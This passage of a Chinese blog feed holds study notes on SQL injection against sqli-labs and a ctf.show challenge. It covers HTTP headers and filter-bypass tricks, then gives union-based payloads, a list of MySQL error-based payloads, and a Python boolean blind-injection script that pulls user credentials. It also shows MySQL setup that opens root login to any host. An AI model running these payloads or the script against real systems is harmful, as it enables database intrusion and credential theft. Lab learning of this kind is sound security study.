Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如：Location：<a href="http://i0.sinaimg.cn/">http://i0.sinaimg.cn</a> &#x2F;dy&#x2F;deco&#x2F;2008&#x2F;0528&#x2F;sinahome_0803_ws_005_text_0.gif<br>23、 Pramga：主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache<br>24、 Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。<br>25、 Range：浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range: bytes&#x3D;1173546-<br>26、 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页&#x2F;URL 获得&#x2F;点击 当前请求中的网址&#x2F;URL。例如：Referer：<a href="http://www.sina.com/">http://www.sina.com/</a><br>27、 Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache&#x2F;2.0.61 (Unix)<br>28、 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko&#x2F;20080404 Firefox&#x2F;2、0、0、14<br>29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked<br>30、 Vary: WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding<br>31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80 (squid&#x2F;2.6.STABLE13)</p><h2 id="3-常见的请求头："><a href="#3-常见的请求头：" class="headerlink" title="3.常见的请求头："></a>3.常见的请求头：</h2><p>Host:Host请求报头域主要用于指定被请求资源的Internet主机和端口号。<br>如：Host: localhost:8088<br>User-Agent:User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。登录一些网站时，很多时候都可以见到显示我们的浏览器、系统信息，这些都是此头的作用。<br>如：User-Agent: Mozilla&#x2F;5.0<br>Referer:Referer包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。<br>如：Referer: <a href="http://192.168.33.1/sqli/Less-18/">http://192.168.33.1/sqli/Less-18/</a><br>Cookie:Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。<br>如：Cookie: username&#x3D;admin; password&#x3D;admin<br>Range:Range可以请求实体的部分内容，多线程下载一定会用到此请求头。<br>如：表示头500字节：Range: bytes&#x3D;0<del>499<br>  表示第二个500字节：Range: bytes&#x3D;500</del>999<br>  表示最后500字节：Range: bytes&#x3D;-500<br>  表示500字节以后的范围：Range: bytes&#x3D;500-<br>X-Forwarded-For:X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。<br>如：X-Forwarded-For: 8.8.8.8<br>Accept:Accept请求报头域用于指定客户端接收哪些MIME类型的信息。<br>如：Accept: text&#x2F;html<br>Accept-Charset:Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。<br>如： Accept-Charset: gb2312</p><h2 id="4-编码问题："><a href="#4-编码问题：" class="headerlink" title="4.编码问题："></a>4.编码问题：</h2><p>Base64使用注意问题<br>一、Base64和URL传参问题<br>标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的“&#x2F;”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入数据库时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符。<br>为解决此问题，可采用一种用于URL的改进Base64编码，它在末尾填充’&#x3D;’号，并将标准Base64中的“+”和“&#x2F;”分别改成了“-”和“_”，这样就免去了在URL编解码和数据库存储时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。</p><p>二、Base64和URL传参问题改善<br>另有一种用于正则表达式的改进Base64变种，它将“+”和“&#x2F;”改成了“!”和“-”，因为“+”,“*”以及前面在IRCu中用到的“[”和“]”在正则表达式中都可能具有特殊含义。<br>此外还有一些变种，它们将“+&#x2F;”改为“_-”或“.<em>”（用作编程语言中的标识符名称）或“.-”（用于XML中的Nmtoken）甚至“</em>:”（用于XML中的Name）。</p><p>三、Base64转换后比原有的字符串长1&#x2F;3<br>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（3<em>8 &#x3D; 4</em>6 &#x3D; 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1&#x2F;3。</p><p>四、Base64转换总结<br>Base64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题</p><h2 id="5-过滤："><a href="#5-过滤：" class="headerlink" title="5.过滤："></a>5.过滤：</h2><p>若是一次性的，且只是将过滤字符换成了空字符：<br>双写绕过—— or&#x3D;oorr、and&#x3D;anandd<br>若是非一次性的，就要考虑一些变形：<br>大小写变形绕过—— or&#x3D;Or&#x3D;oR&#x3D;OR<br>利用运算符——   or&#x3D;||、and&#x3D;&amp;&amp;<br>URL编码绕过——  #&#x3D;%23，Hex编码—— ~&#x3D;0x7e<br>添加注释  ——  &#x2F;<em>or</em>&#x2F;<br>在开始注入前还要说一下的是，在url中空格和一些特殊字符会进行url编码例如：#是%23，空格是%20<br>所以这样写 ?id&#x3D;1’# 将会报错，要写成这样 ?id&#x3D;1’%23 才不会报错，所以我们可以使用 – #进行注入或者 –+</p><p>%09  TAB 键（水平）<br>%0a  新建一行<br>%0c  新的一页<br>%0d  return 功能<br>%0b TAB 键（垂直）<br>%a0  空格</p><p>GET型的方式我们是以url形式提交的，因此数据会通过url编码,其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。那么汉字的url编码呢？很简单，看例子：“胡”的ascii码是 -17670，十六进制是BAFA，url编码是“%BA%FA”。 （汉字转ASCII码：默认情况下，是使用扩展ASCII，第一个字节为负数时（或理解为127以上）是识别，加后一个字节共两个字节。想了解更多自行查阅资料）</p><p>那么我们输入1%df%27，被转义为1�&#39;,经过url编码后为%31%df%5c%27,然后提交给数据库，在使用GBK编码的数据库会进行解码，于是变成了1瀿’        df5c就是一个宽字符，我不知道是啥汉字就用了’瀿’来代替，再说一下这个�是乱码，原因是两个不同字符集编码转换问题导致的（比如:GBK和Unicode））</p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>postman的sql注入以及报错和布尔盲注</title>
      <link href="/2023/12/24/postman%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%8A%A5%E9%94%99%E5%92%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/12/24/postman%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%8A%A5%E9%94%99%E5%92%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、postman的使用："><a href="#一、postman的使用：" class="headerlink" title="一、postman的使用："></a>一、postman的使用：</h2><p>1.在物理机的火狐浏览器上面查找<a href="http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/">http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/</a>，打开之后图片为<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703327960884-c9591324-cfe3-4da9-bdf3-299d93af08d1.png" alt="image.png"><br>2.按下F12，点击网络与重新加载，找到API，即名字为v3.php?page&#x3D;1&amp;limit&#x3D;10的文件，复制右边栏GET请求的网址，粘贴到postman的发包框内并且选择对应的请求。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703328156631-f4c21b95-4b10-4e37-8820-f7bdad37e199.png" alt="image.png"><br>3.在前面两行已经有page和limit，在表格第三行输入id和1，点击send,查询到了id&#x3D;1的用户名和密码。然后找闭合点，在1的后面加单引号，再点击send,发现底栏报错，说明1’是闭合点<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703328266230-d7cab5a7-e3b7-4629-b106-dc72f1cee155.png" alt="image.png"><br>接着在1’后面输入order by – -查看列数，当输入到3时，发现能够正常输出，输入为4时为空，说明没有4列。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703328307345-772a307e-41d7-4697-8c1f-4757842e53d0.png" alt="image.png"><br>5.查字段名，把1改成-1，在表格1’后面使用union联合sql语句,和之前的报错型的步骤基本相同<br>-1’ union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name&#x3D;’ctfshow_user3’ and table_schema&#x3D;database();– -<br>6.查字段，在表格1’后面使用union联合sql语句。-1’ union select 1,2,group_concat(id,”<del>“,username,”</del>“,password) from ctfshow_user3 ;– -<br>此时这么输入结果为空。<br>因为我们要的得到的是username&#x3D;’flag’的密码，所以要删除username,最终为-1’ union select 1,2,group_concat(id,”<del>“,username,”</del>“,password) from ctfshow_user3 ;– -<br>其实这里差三个·数据也是可以的，但是为什么没有查出来呢，因为在回显的时候进行了处理导致后台接收到了三个数据，回显只有两个。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333028485-8a9e7343-75fc-40ba-b36b-457acd571810.png" alt="69891f6cca6fb68e7013742b48bce68.png"></p><h2 id="二、报错："><a href="#二、报错：" class="headerlink" title="二、报错："></a>二、报错：</h2><p>原理：<br>通常利用恶意构造的SQL语句触发数据库执行错误，并通过捕获这些错误信息来获取所需的数据。<br>常见的报错函数：注意每次使用前面需要加and</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="title function_ invoke__">extractvalue</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(select <span class="title function_ invoke__">user</span>()),<span class="number">0x7e</span>)))-- -</span><br><span class="line">(select <span class="number">1</span> <span class="keyword">from</span> (select <span class="title function_ invoke__">count</span>(*),<span class="title function_ invoke__">concat</span>(<span class="title function_ invoke__">user</span>(),<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a)</span><br><span class="line">(<span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(select <span class="title function_ invoke__">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br><span class="line"><span class="title function_ invoke__">geometrycollection</span>((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span>())a)b))</span><br><span class="line"><span class="title function_ invoke__">multipoint</span>((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span>())a)b))</span><br><span class="line"><span class="title function_ invoke__">polygon</span>((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span>())a)b)) </span><br><span class="line"><span class="title function_ invoke__">multipolygon</span>((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span>())a)b))</span><br><span class="line"><span class="title function_ invoke__">linestring</span>((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span>())a)b))</span><br><span class="line"><span class="title function_ invoke__">exp</span>(~(select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span>())a)) </span><br></pre></td></tr></table></figure><p>这里报错以第五关为例，输入正确时输出You are in……..,错误时报错。也就是说此时的情况就是在输入正确时不再会显示数据库的相关信息了，对于第五关而言，可以用报错或者布尔盲注。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703330189173-573d587a-29b2-4351-bed0-4bdd58cd234f.png" alt="image.png"><br>查看第五关的代码发现：正确会输出You are in…….，没有回显，错误就输出sql报错。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703330463247-e6b817c7-b622-4cf1-9718-1d19717355c1.png" alt="image.png"><br>第五关解法：<br>报错，先找到闭合点，然后进行报错处理，将select user()或者user()换成自己需要的语句就可以了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703332481311-2b0f6c5b-9292-4dc8-af8c-81e062ed64d9.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703332690009-3cc8bfff-6357-4b60-a1d3-8e0890be4f0f.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333425766-9a5578a3-16c3-415c-8cf9-727852a2fee9.png" alt="image.png"></p><p>如上图所示，查找了users表中的id，当用第一个函数查找username时报错，用updatexml就不会报错但是也只是显示了一部分，也就是说报错的函数不支持太长的字段，每一种报错回显的方法不同所展示的字段也会不同，同时也会受到mysql版本以及其他因素的影响而产生不了结果。</p><h2 id="三、布尔盲注："><a href="#三、布尔盲注：" class="headerlink" title="三、布尔盲注："></a>三、布尔盲注：</h2><p>在讲布尔盲注之前讲解了sql注入的基本内容：<br>1.sql注入是什么？<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333591746-479068be-26e2-4680-9115-2bc7d3a8eb96.png" alt="image.png"><br>2.sql注入的危害：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333612435-f359db25-09cc-4528-8503-385be995a0a8.png" alt="image.png"><br>3.sql注入的分类：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333634374-66bb15da-daee-4989-a9e4-53274b811abd.png" alt="image.png"><br>4.mysql常见的内置函数：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333683028-f166cf39-b8f5-4751-8173-3edda7885cd3.png" alt="image.png"><br>可以用select函数进行拼接展示想要的结果。<br>5.sql Injection函数：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333702283-ccd26024-7763-4946-93a5-2f4395f48f3c.png" alt="image.png"><br>6.sql的注释：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333744680-0b8e20f2-9a5c-4f54-bb92-719c20772b91.png" alt="image.png"><br>7.information_schema库的相关信息<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703333757086-69fb4cb9-d45d-47c1-80aa-01fb54ce598d.png" alt="image.png"><br>8.union联合查询的方法：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703334216358-ec8b5313-49a8-4598-b320-c4cfc7c50577.png" alt="image.png"><br>正题：<br>布尔盲注是什么？<br>      SQL中的布尔盲注（Boolean-based Blind SQL Injection）是一种利用布尔逻辑（Boolean logic）来进行盲注（Blind Injection）攻击的技术。盲注是指攻击者无法直接获取数据库错误信息的情况下，通过观察应用程序的不同行为来推断数据库中的信息。布尔盲注是盲注攻击中的一种形式，它利用布尔逻辑的真与假来推断数据库中数据的情况。<br>       在布尔盲注攻击中，攻击者通过构造恶意的SQL语句来判断某个条件的真假，并观察应用程序的不同行为以推断数据库中的信息。攻击者通常会利用条件语句（如 WHERE 子句）中的布尔逻辑来推断数据库中存在的数据。攻击者通过不断尝试不同的条件，观察应用程序在条件为真和条件为假时的行为差异，从而逐步推断数据库中的数据信息。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703334424961-3c07c2e9-c41d-494e-b244-c128b2f7189f.png" alt="image.png"></p><p>sql注入中的布尔盲注需要有一定的python基础，布尔注入可以在以下情况下使用：</p><ol><li>验证时的布尔注入：应用程序在验证用户提供的输入时，通过布尔逻辑来判断输入是否有效。如果输入被用于构造SQL查询并没有正确的过滤，攻击者可以利用布尔注入来绕过验证机制。</li><li>布尔型条件查询的注入：应用程序根据某些条件进行查询，并根据查询结果的真假来决定下一步的行为。如果应用程序在构造查询条件时没有正确过滤用户提供的输入，攻击者可以利用布尔注入来改变查询条件的真假，从而影响应用程序的行为。</li><li>布尔型错误处理的注入：当应用程序发生错误时，有些应用程序会根据错误是否发生来执行不同的操作。如果应用程序在处理错误时没有正确过滤用户提供的输入，攻击者可以利用布尔注入来影响错误处理流程，可能导致泄露敏感的信息。</li></ol><p>此次python代码采用的是二分法，要对编码比较熟悉，从32到128进行二分法，提高效率，如果一个个去进行判断将会导致python的运行效率太低。<br>代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.2.110/sqli/Less-6/?id=1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">db</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">150</span>):</span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            paramsGet = url + <span class="string">&quot;/**/and/**/ascii(substring((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="title function_ invoke__">format</span>(</span><br><span class="line">                i, tmp)</span><br><span class="line">            response = session.<span class="title function_ invoke__">get</span>(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> in response.text:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin + end) <span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="title function_ invoke__">chr</span>(tmp)</span><br><span class="line">        <span class="keyword">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">db</span>()</span><br></pre></td></tr></table></figure><p>能够正常运行的前提是导入了requests模块。<br>这里以第六关进行示范：<br>第六关的闭合点是双引号，直接在url上面进行修改：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703335373853-fda99c3c-f0e3-41b5-92f6-af47c2947b37.png" alt="image.png"><br>在paramGet后面的substring里面输入想要查询的字段，在if里面输入正确时的回显信息<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703335544368-e90a31b5-2f27-42b4-9715-5b2bce708fed.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703335438709-35bb5ff8-ab23-43ca-9956-061cc976c5ad.png" alt="image.png"><br>运行以下查看结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703335609220-3a1e14b9-8aee-4fae-90c2-201b61c822d1.png" alt="image.png"><br>以下是常用的python文件，仅供参考。<br><a href="https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703335671306-8975b2b0-a087-4829-854c-70b9ad3dbede.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703335671306-8975b2b0-a087-4829-854c-70b9ad3dbede.py%22,%22name%22:%22%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93.py%22,%22size%22:912,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u55c0cc3f-c59b-409a-9d32-35351fdb404%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22id%22:%22u4688eb47%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">爆数据库.py</a><br><a href="https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703335692120-ec8ade9b-573f-48d2-8f6c-4895a27a0ec3.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703335692120-ec8ade9b-573f-48d2-8f6c-4895a27a0ec3.py%22,%22name%22:%22%E7%88%86%E8%A1%A8.py%22,%22size%22:828,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u33fa9094-22ee-4302-a3da-b2f4246f657%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22id%22:%22u9198c3ea%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">爆表.py</a><br><a href="https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703335703391-c034745a-1904-47c7-85b4-cd73c4efe4c9.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703335703391-c034745a-1904-47c7-85b4-cd73c4efe4c9.py%22,%22name%22:%22%E7%88%86%E5%AD%97%E6%AE%B5.py%22,%22size%22:836,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22ubbe999b3-4485-4d9d-b710-51ad0ea8b25%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22id%22:%22u37747325%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">爆字段.py</a><br><a href="https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703335713715-fd287cbe-0753-4994-a16e-1f58a7b720e6.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703335713715-fd287cbe-0753-4994-a16e-1f58a7b720e6.py%22,%22name%22:%22%E7%88%86%E5%80%BC.py%22,%22size%22:789,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22ub46d306d-2267-4448-a065-09e1b9a0578%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22id%22:%22uc1fe6b26%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">爆值.py</a></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> postman,sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql的准备与基础知识</title>
      <link href="/2023/12/24/sql%E7%9A%84%E5%87%86%E5%A4%87%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/12/24/sql%E7%9A%84%E5%87%86%E5%A4%87%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="一、准备操作："><a href="#一、准备操作：" class="headerlink" title="一、准备操作："></a>一、准备操作：</h1><p>继续是在phpstudy进行操作。<br>首先下载PHP两个版本，5.5.9和5.4.45这两个都行。<br>干掉PHPstudy网站之前的根目录下的文件，找回sqli的压缩包并解压到根目录之下。<br>特性：<br>找到MySQL的根目录，输入cmd<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703082542141-935d5911-3817-40c4-959a-ef53425b609a.png" alt="image.png"><br>输入mysql -u root -p接着输入密码。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703082625166-9613a5d3-731e-4c7e-93a0-13e3777b1176.png" alt="image.png"></p><p>show databases; 展示数据库<br>use security;使用security这个数据库<br>show tables;展示security数据库里面的表<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703082738111-0ba06313-9136-42d5-8b82-d04adace9478.png" alt="image.png"><br>在mysql中输入 select1，2，3.<br>在 MySQL 中输入 “SELECT 1, 2, 3;” 将会返回一个结果集，其中包含三个列和一行数据。结果集将如下所示：</p><table><thead><tr><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>1</td><td>2</td><td>3</td></tr><tr><td>每个列表示一个整数，并且在这种情况下，行中只有一行数据。这是一个简单的示例，仅用于说明在 MySQL 中使用 SELECT 语句查询时可以返回的结果。</td><td></td><td></td></tr></tbody></table><h2 id="二、联合查询："><a href="#二、联合查询：" class="headerlink" title="二、联合查询："></a>二、联合查询：</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703084009015-cb05c2a9-32cf-46ac-b574-fdeb62aa6bbf.png" alt="image.png"></p><p>mysql多少版本有information_schema？<br>在MySQL中，information_schema数据库是从MySQL 5.0.2版本开始引入的，这意味着从MySQL 5.0.2版本及更高版本的MySQL中都会包含<code>information_schema</code>数据库。<code>information_schema</code>数据库包含了关于数据库实例的元数据信息，例如表、列、索引、权限等。它提供了一种标准的方法来查询关于数据库对象的信息，非常有用于进行数据库的元数据查询和分析工作。因此，从MySQL 5.0.2及更高版本开始，可以使用<code>information_schema</code>数据库来查询和分析数据库中的元数据信息。</p><p>三个联合查询语句的在mysql上面的操作：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703084311101-d356a6fb-db34-4e36-a84b-f95ab69b4741.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703084341923-bc24c421-07bf-4e6b-80e8-8f36e117f35d.png" alt="image.png"><br>在火狐上插件的安装HackBar，下载资源包<a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1703084557111-e0fdf765-6556-4d1c-b347-a49ae37614ab.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1703084557111-e0fdf765-6556-4d1c-b347-a49ae37614ab.zip%22,%22name%22:%22hackbar-2.3.1-fx.xpi.zip%22,%22size%22:106976,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u2dcad7ef-b2b2-493b-84cb-fff62328351%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u99c6efd5%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">hackbar-2.3.1-fx.xpi.zip</a><br>在火狐浏览器上面点击三个点，点击扩展和主题，设置，从文件安装附近组件。按下F12，唤醒控制台，找到HackBar。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703084720153-bac29b7a-a1e6-461d-bea0-37ecb91d5e8d.png" alt="image.png"><br>Load 截取当前网址<br>Execute 执行<br>切记：<br>       在MySQL5.0版本后，MySQL默认正在数据库重存放一个information_schema的数据库，在该库中，我们需要记住三个表名，分别是schemata，tables，columns。</p><ul><li><pre><code>Schemata表存储的是该用户创建的所有数据库的库名，需要记住该表中记录数据库名的字段名为schema_name。</code></pre></li><li><pre><code>Tables表鵆该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表明的字段分别是table_schema 和 table_name。</code></pre></li><li><pre><code>Columns表存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表明、字段名为table_schema、table_name、columns_name。</code></pre></li></ul><h2 id="三、mysql数据库"><a href="#三、mysql数据库" class="headerlink" title="三、mysql数据库"></a>三、mysql数据库</h2><p>1.进入mysql：<br>首先了解mysql数据库的基本使用方法。<br>use mysql;这行命令是使用这个数据库。<br>update user set Host&#x3D;’%’ where user&#x3D;”root”;将 “root” 用户的 Host 字段设置为 “%”。”% “是一个通配符，它代表匹配任何字符或字符序列。因此，这个语句将允许 “root” 用户从任何主机连接到 MySQL 数据库服务器。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703248459753-6b224d4a-c010-48fd-a94d-a640f501a1a6.png" alt="image.png"><br>flush privileges;重新加载权限表并生效。这里确保mysq已经连接,否则会失败。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703248790834-59369a70-5063-45c2-978a-765e5f71050b.png" alt="image.png"><br>四、基本操作：</p><h3 id="库："><a href="#库：" class="headerlink" title="库："></a>库：</h3><p>展示数据库:show databases();<br>注意这里要加;，否则必会报错。<br>创建数据库:<br>基本格式：create database database_name；<br>create database axioes;<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703249788735-f6317fb4-0352-4fe1-b4a0-e04cafc5a87b.png" alt="image.png"><br>删除数据库:<br>drop database database_name;<br>drop database axioes;删掉刚刚创建的axioes<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703249971695-7146c423-dd23-4717-ae9a-f643b009f322.png" alt="image.png"><br>选择数据库并使用:<br>use database_name;<br>use security; 选择security这个数据库。</p><h3 id="表："><a href="#表：" class="headerlink" title="表："></a>表：</h3><p>选择表的前提是选择一个数据库。<br>创建表：<br>create table table_name(列名 类型(长度等等));<br>create table student(id int,name char(10),age int,sex char(20));#创建一个student表列名分别为id,name,age,sex。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703250650170-578839b7-d8e0-4c19-9480-5516330f0e5d.png" 